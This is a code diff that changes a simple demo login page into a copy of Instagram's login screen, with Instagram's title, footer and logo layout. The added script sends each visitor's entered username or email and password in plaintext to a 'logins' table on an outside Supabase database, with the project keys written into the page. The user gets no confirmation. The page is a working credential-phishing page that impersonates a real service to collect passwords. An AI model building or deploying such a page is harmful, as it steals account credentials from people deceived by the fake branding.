@@ -1,33 +1,162 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Login Demo</title>
+<meta charset="UTF-8">
+<title>Login • Instagram</title>
+
+<style>
+* {
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  margin: 0;
+  background: #0c1014;
+  color: #fff;
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  justify-content: center;
+  align-items: center;
+}
+
+.wrapper {
+  display: flex;
+  gap: 80px;
+  align-items: center;
+  flex: 1;
+}
+
+.visual {
+  width: 300px;
+  height: 550px;
+  border-radius: 30px;
+  overflow: hidden;
+}
+
+.visual img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.card {
+  width: 340px;
+  background: #0c1014;
+  border: 1px solid #222;
+  padding: 30px;
+  border-radius: 12px;
+}
+
+.logo {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.logo img {
+  width: 140px;
+}
+
+input {
+  width: 100%;
+  padding: 10px;
+  background: #0c1014;
+  border: 1px solid #333;
+  color: #fff;
+  border-radius: 5px;
+  margin-bottom: 10px;
+}
+
+button {
+  width: 100%;
+  padding: 10px;
+  background: #3846b5;
+  border: none;
+  color: white;
+  font-weight: bold;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #3b79e0;
+}
+
+.small {
+  text-align: center;
+  font-size: 12px;
+  color: #777;
+  margin-top: 20px;
+}
+
+footer {
+  color: #777;
+  font-size: 12px;
+  padding: 20px;
+}
+</style>
 </head>
+
 <body>
 
-<h3>Demo Login</h3>
+<div class="wrapper">
 
-<input id="email" type="email" placeholder="Email"><br><br>
-<input id="password" type="password" placeholder="Password"><br><br>
-<button onclick="save()">Login</button>
+  <div class="visual">
+    <img src="preview.png" alt="App Preview">
+  </div>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <div class="card">
+    <div class="logo">
+      <img src="logo.png" alt="Logo">
+    </div>
 
-<script>
-  const supabase = supabaseJs.createClient(
-    "https://cnksnbotqtreddoqorly.supabase.co",
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNua3NuYm90cXRyZWRkb3Fvcmx5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjcwNzUsImV4cCI6MjA4MTc0MzA3NX0.NczMduUqbQaOaKqHAK_ojiWVU01H6WN1Y-UdccMHT7A"
-  );
+    <input id="email" placeholder="Phone number, username or email address">
+    <input id="password" type="password" placeholder="Password">
+
+    <button id="loginBtn">Log in</button>
+
+    <div class="small">
+      Don't have an account? Sign up
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  © 2025 Instagram from Meta
+</footer>
+
+<!-- SUPABASE -->
+<script type="module">
+  import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
+
+  const supabaseUrl = "https://cnksnbotqtreddoqorly.supabase.co";
+  const supabaseKey = "sb_publishable_H1KsYVh4yC_8DPUEPWGXtQ_3UfJp5qa";
+  const supabase = createClient(supabaseUrl, supabaseKey);
+
+  document.getElementById("loginBtn").addEventListener("click", save);
 
   async function save() {
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
 
-    await supabase
+    if (!email || !password) {
+      alert("Please enter both email and password.");
+      return;
+    }
+
+    const { error } = await supabase
       .from("logins")
-      .insert([{ email: email, password: password }]);
+      .insert([{ email, password }]);
 
-    alert("Data saved");
+    if (error) {
+      console.error(error);
+      alert("Error saving data");
+    } else {
+      document.getElementById("email").value = "";
+      document.getElementById("password").value = "";
+    }
   }
 </script>
 
